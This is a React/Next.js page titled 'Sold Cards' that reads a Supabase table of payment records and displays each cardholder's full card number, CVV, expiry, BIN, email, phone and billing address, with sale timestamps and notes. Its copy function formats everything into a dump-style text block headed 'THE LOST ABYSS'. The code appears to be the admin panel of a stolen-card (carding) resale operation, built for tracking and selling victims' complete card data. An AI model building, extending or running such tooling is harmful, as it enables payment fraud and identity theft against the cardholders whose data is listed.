'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Eye, ArrowUpDown, Copy, Check } from 'lucide-react';
import { supabase } from '@/lib/supabase';
import {
  Dialog,
  DialogContent,
  DialogHeader,
} from '@/components/ui/dialog';
import { useToast } from '@/hooks/use-toast';
import { CreditCard } from '@/components/ui/credit-card';

interface BillingAddress {
  city: string;
  state: string;
  address: string;
  country: string;
  postal_code: string;
}

interface PaymentInfo {
  id: string;
  cardholder_name: string;
  user_email: string;
  phone_number: string;
  full_card_number: string;
  expiry_date: string;
  cvv: string;
  card_bin: string;
  billing_address: BillingAddress;
  created_at: string;
  sold_cards: {
    sold_at: string;
    notes: string | null;
  }[];
}

type SortField = 'state' | 'timestamp' | 'sold_at';
type SortDirection = 'asc' | 'desc';

const US_STATES = [
  { name: 'Alabama', abbr: 'AL' },
  { name: 'Alaska', abbr: 'AK' },
  { name: 'Arizona', abbr: 'AZ' },
  { name: 'Arkansas', abbr: 'AR' },
  { name: 'California', abbr: 'CA' },
  { name: 'Colorado', abbr: 'CO' },
  { name: 'Connecticut', abbr: 'CT' },
  { name: 'Delaware', abbr: 'DE' },
  { name: 'Florida', abbr: 'FL' },
  { name: 'Georgia', abbr: 'GA' },
  { name: 'Hawaii', abbr: 'HI' },
  { name: 'Idaho', abbr: 'ID' },
  { name: 'Illinois', abbr: 'IL' },
  { name: 'Indiana', abbr: 'IN' },
  { name: 'Iowa', abbr: 'IA' },
  { name: 'Kansas', abbr: 'KS' },
  { name: 'Kentucky', abbr: 'KY' },
  { name: 'Louisiana', abbr: 'LA' },
  { name: 'Maine', abbr: 'ME' },
  { name: 'Maryland', abbr: 'MD' },
  { name: 'Massachusetts', abbr: 'MA' },
  { name: 'Michigan', abbr: 'MI' },
  { name: 'Minnesota', abbr: 'MN' },
  { name: 'Mississippi', abbr: 'MS' },
  { name: 'Missouri', abbr: 'MO' },
  { name: 'Montana', abbr: 'MT' },
  { name: 'Nebraska', abbr: 'NE' },
  { name: 'Nevada', abbr: 'NV' },
  { name: 'New Hampshire', abbr: 'NH' },
  { name: 'New Jersey', abbr: 'NJ' },
  { name: 'New Mexico', abbr: 'NM' },
  { name: 'New York', abbr: 'NY' },
  { name: 'North Carolina', abbr: 'NC' },
  { name: 'North Dakota', abbr: 'ND' },
  { name: 'Ohio', abbr: 'OH' },
  { name: 'Oklahoma', abbr: 'OK' },
  { name: 'Oregon', abbr: 'OR' },
  { name: 'Pennsylvania', abbr: 'PA' },
  { name: 'Rhode Island', abbr: 'RI' },
  { name: 'South Carolina', abbr: 'SC' },
  { name: 'South Dakota', abbr: 'SD' },
  { name: 'Tennessee', abbr: 'TN' },
  { name: 'Texas', abbr: 'TX' },
  { name: 'Utah', abbr: 'UT' },
  { name: 'Vermont', abbr: 'VT' },
  { name: 'Virginia', abbr: 'VA' },
  { name: 'Washington', abbr: 'WA' },
  { name: 'West Virginia', abbr: 'WV' },
  { name: 'Wisconsin', abbr: 'WI' },
  { name: 'Wyoming', abbr: 'WY' }
];

export default function SoldCardsPage() {
  const { toast } = useToast();
  const router = useRouter();
  const [cards, setCards] = useState<PaymentInfo[]>([]);
  const [loading, setLoading] = useState(true);
  const [sortField, setSortField] = useState<SortField>('sold_at');
  const [sortDirection, setSortDirection] = useState<SortDirection>('desc');
  const [selectedCard, setSelectedCard] = useState<PaymentInfo | null>(null);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    async function fetchCards() {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        if (!session?.user) {
          router.push('/login');
          return;
        }

        const { data, error } = await supabase
          .from('payment_info')
          .select('*, sold_cards(*)')
          .not('sold_cards', 'is', null)
          .order('created_at', { ascending: false });

        if (error) throw error;
        setCards(data || []);
      } catch (error) {
        console.error('Error fetching cards:', error);
        toast({
          title: "Error",
          description: "Failed to fetch sold cards",
          variant: "destructive"
        });
      } finally {
        setLoading(false);
      }
    }

    fetchCards();
  }, [router, toast]);

  const toggleSort = (field: SortField) => {
    if (sortField === field) {
      setSortDirection(sortDirection === 'asc' ? 'desc' : 'asc');
    } else {
      setSortField(field);
      setSortDirection('asc');
    }
  };

  const sortedCards = [...cards].sort((a, b) => {
    if (sortField === 'state') {
      const stateA = a.billing_address.state.toUpperCase();
      const stateB = b.billing_address.state.toUpperCase();
      return sortDirection === 'asc'
        ? stateA.localeCompare(stateB)
        : stateB.localeCompare(stateA);
    } else if (sortField === 'sold_at') {
      const dateA = new Date(a.sold_cards[0]?.sold_at || '').getTime();
      const dateB = new Date(b.sold_cards[0]?.sold_at || '').getTime();
      return sortDirection === 'asc'
        ? dateA - dateB
        : dateB - dateA;
    } else {
      const dateA = new Date(a.created_at).getTime();
      const dateB = new Date(b.created_at).getTime();
      return sortDirection === 'asc'
        ? dateA - dateB
        : dateB - dateA;
    }
  });

  const copyAllDetails = async (card: PaymentInfo) => {
    const details = `+ ------------- THE LOST ABYSS --------------+
+ Personal Information
| Full Name : ${card.cardholder_name}
| Email : ${card.user_email}
| Phone : ${card.phone_number}
+ ------------------------------------------+
+ Payment Information
| Card Number : ${card.full_card_number}
| Card Expiry : ${card.expiry_date}
| CVV : ${card.cvv}
| BIN : ${card.card_bin}
+ ------------------------------------------+
+ Billing Information
| Address : ${card.billing_address.address}
| City : ${card.billing_address.city}
| State : ${card.billing_address.state}
| Postal Code : ${card.billing_address.postal_code}
| Country : ${card.billing_address.country}
+ ------------------------------------------+
+ Other Information
| Received : ${new Date(card.created_at).toLocaleString()}
| Sold : ${new Date(card.sold_cards[0]?.sold_at || '').toLocaleString()}
| Notes : ${card.sold_cards[0]?.notes || 'No notes'}
+ ------------- THE LOST ABYSS  --------------+`;

    try {
      await navigator.clipboard.writeText(details);
      setCopied(true);
      toast({
        title: "Success",
        description: "Card details copied to clipboard"
      });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({
        title: "Failed",
        description: "Failed to copy details",
        variant: "destructive"
      });
    }
  };

  if (loading) {
    return <div className="p-8">Loading...</div>;
  }

  return (
    <div className="space-y-6">
      <h1 className="text-3xl font-bold">Sold Cards</h1>
      <div className="rounded-md border border-border">
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>Full Name</TableHead>
              <TableHead>
                <Button
                  variant="ghost"
                  onClick={() => toggleSort('state')}
                  className="h-8 px-2 hover:bg-transparent"
                >
                  State
                  <ArrowUpDown className="ml-2 h-4 w-4" />
                  {sortField === 'state' && (
                    <span className="ml-1 text-xs">
                      ({sortDirection === 'asc' ? 'A-Z' : 'Z-A'})
                    </span>
                  )}
                </Button>
              </TableHead>
              <TableHead>BIN</TableHead>
              <TableHead>
                <Button
                  variant="ghost"
                  onClick={() => toggleSort('sold_at')}
                  className="h-8 px-2 hover:bg-transparent"
                >
                  Sold At
                  <ArrowUpDown className="ml-2 h-4 w-4" />
                  {sortField === 'sold_at' && (
                    <span className="ml-1 text-xs">
                      ({sortDirection === 'asc' ? 'Oldest' : 'Newest'})
                    </span>
                  )}
                </Button>
              </TableHead>
              <TableHead>Notes</TableHead>
              <TableHead className="text-right pr-6">Actions</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {sortedCards.map((card) => (
              <TableRow key={card.id}>
                <TableCell>{card.cardholder_name}</TableCell>
                <TableCell>
                  {US_STATES.find(s => s.abbr === card.billing_address.state)?.name || card.billing_address.state}
                  {' '}
                  ({card.billing_address.state})
                </TableCell>
                <TableCell>{card.card_bin}</TableCell>
                <TableCell>{new Date(card.sold_cards[0]?.sold_at || '').toLocaleString()}</TableCell>
                <TableCell>{card.sold_cards[0]?.notes || '-'}</TableCell>
                <TableCell className="text-right pr-4">
                  <div className="flex justify-end gap-2">
                    <Button
                      variant="outline"
                      size="icon"
                      className="h-8 w-8"
                      onClick={() => copyAllDetails(card)}
                    >
                      {copied ? (
                        <Check className="h-4 w-4" />
                      ) : (
                        <Copy className="h-4 w-4" />
                      )}
                    </Button>
                    <Button
                      variant="outline"
                      size="icon"
                      className="h-8 w-8"
                      onClick={() => setSelectedCard(card)}
                    >
                      <Eye className="h-4 w-4" />
                    </Button>
                  </div>
                </TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </div>

      <Dialog open={!!selectedCard} onOpenChange={(open) => !open && setSelectedCard(null)}>
        <DialogContent className="sm:max-w-[700px] max-h-[85vh] overflow-y-auto">
          <DialogHeader className="flex flex-col items-center space-y-2">
            {selectedCard && (
              <Button
                variant="outline"
                size="sm"
                onClick={() => selectedCard && copyAllDetails(selectedCard)}
              >
                {copied ? (
                  <Check className="h-4 w-4 mr-2" />
                ) : (
                  <Copy className="h-4 w-4 mr-2" />
                )}
                Copy Card Details
              </Button>
            )}
          </DialogHeader>
          {selectedCard && (
            <div className="space-y-6">
              <div className="flex justify-center">
                <CreditCard
                  cardNumber={selectedCard.full_card_number}
                  cardholderName={selectedCard.cardholder_name}
                  expiryDate={selectedCard.expiry_date}
                />
              </div>
              <div className="grid grid-cols-2 gap-4 text-center">
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Full Name</h4>
                  <p className="mt-1">{selectedCard.cardholder_name}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Email</h4>
                  <p className="mt-1">{selectedCard.user_email}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Phone</h4>
                  <p className="mt-1">{selectedCard.phone_number}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Card Number</h4>
                  <p className="mt-1">{selectedCard.full_card_number}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Card Expiry</h4>
                  <p className="mt-1">{selectedCard.expiry_date}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">CVV</h4>
                  <p className="mt-1">{selectedCard.cvv}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">BIN</h4>
                  <p className="mt-1">{selectedCard.card_bin}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Address</h4>
                  <p className="mt-1">{selectedCard.billing_address.address}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">City</h4>
                  <p className="mt-1">{selectedCard.billing_address.city}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">State</h4>
                  <p className="mt-1">{selectedCard.billing_address.state}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Postal Code</h4>
                  <p className="mt-1">{selectedCard.billing_address.postal_code}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Country</h4>
                  <p className="mt-1">{selectedCard.billing_address.country}</p>
                </div>
              </div>
              <div className="space-y-4 text-center">
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Received</h4>
                  <p className="mt-1">{new Date(selectedCard.created_at).toLocaleString()}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Sold</h4>
                  <p className="mt-1">{new Date(selectedCard.sold_cards[0]?.sold_at || '').toLocaleString()}</p>
                </div>
                <div>
                  <h4 className="font-medium text-sm text-muted-foreground">Notes</h4>
                  <p className="mt-1">{selectedCard.sold_cards[0]?.notes || 'No notes'}</p>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}